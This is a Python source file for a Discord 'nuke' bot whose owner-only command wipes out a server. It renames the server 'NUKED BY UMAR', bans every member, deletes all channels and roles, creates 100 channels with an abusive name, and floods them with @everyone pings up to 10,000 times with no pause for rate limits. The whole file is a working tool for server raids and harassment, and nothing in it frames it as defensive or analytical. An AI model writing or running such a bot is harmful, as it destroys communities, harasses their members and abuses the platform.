import discord
from discord.ext import commands
import asyncio
import os

# ===== CONFIG =====
TOKEN = os.environ.get('TOKEN')
OWNER_ID = 361069640962801664
PREFIX = ">"

# ===== BOT SETUP =====
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ===== NUKE COMMAND - MAXIMUM SPEED =====
@bot.command(name='nuke')
async def nuke(ctx):
    if ctx.author.id != OWNER_ID:
        return
    
    guild = ctx.guild
    
    # STEP 0: CHANGE SERVER NAME
    try: await guild.edit(name="NUKED BY UMAR")
    except: pass
    
    # STEP 1: MASS BAN EVERYONE (MAX SPEED)
    for member in guild.members:
        if member != bot.user and member.id != OWNER_ID:
            try: await member.ban(reason="nuked by umar")
            except: pass
    
    # STEP 2: DELETE ALL CHANNELS (MAX SPEED)
    for channel in guild.channels:
        try: await channel.delete()
        except: pass
    
    # STEP 3: DELETE ALL ROLES (MAX SPEED)
    for role in guild.roles:
        if role.name != "@everyone":
            try: await role.delete()
            except: pass
    
    # STEP 4: CREATE 100 CHANNELS AND PING - MAXIMUM SPEED
    channels = []
    tasks = []
    
    # Fire off all channel creations at once
    for i in range(100):
        tasks.append(guild.create_text_channel(f"get shitted on by umar"))
    
    # Wait for all channels to create
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, discord.TextChannel):
            channels.append(result)
            # Fire and forget pings
            asyncio.create_task(result.send(f"@everyone nuked by umar"))
    
    # STEP 5: MASS PING ALL CHANNELS AT ONCE - ABSOLUTE MAX SPEED
    ping_target = 10000
    ping_count = len(channels)
    
    # Create a queue of channels that never ends
    while ping_count < ping_target:
        # Fire pings in ALL channels simultaneously
        ping_tasks = []
        for channel in channels:
            ping_tasks.append(channel.send(f"@everyone nuked by umar"))
        
        # Execute all pings at once
        results = await asyncio.gather(*ping_tasks, return_exceptions=True)
        ping_count += len([r for r in results if not isinstance(r, Exception)])
        
        # If we hit rate limits hard, try again immediately - NO WAITING

# ===== RUN BOT =====
bot.run(TOKEN)
